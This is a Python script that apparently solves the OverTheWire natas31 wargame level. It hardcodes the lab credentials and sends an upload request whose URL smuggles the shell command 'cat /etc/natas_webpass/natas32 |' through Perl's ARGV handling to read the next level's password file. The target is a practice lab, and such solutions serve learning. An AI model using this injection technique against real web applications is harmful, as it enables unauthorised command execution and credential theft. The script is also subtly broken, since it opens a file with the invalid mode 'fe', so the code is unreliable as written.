import requests
from requests.auth import HTTPBasicAuth
import json
import datetime
import time
import string
from urllib import parse
import base64
import urllib
import re



natasURL = 'http://natas31.natas.labs.overthewire.org/'
natas_usr   = 'natas31'
natas_pword = 'hay7aecuungiuKaezuathuk9biin0pu1'

r = requests.Session()

injection_url = natasURL + '?cat /etc/natas_webpass/natas32 |'
files = {'file': open('real.csv','fe')}

resp = requests.post(injection_url, files=files, data={'file': 'ARGV', 'submit':'Upload'}, auth=(natas_usr, natas_pword))

print(resp.text)



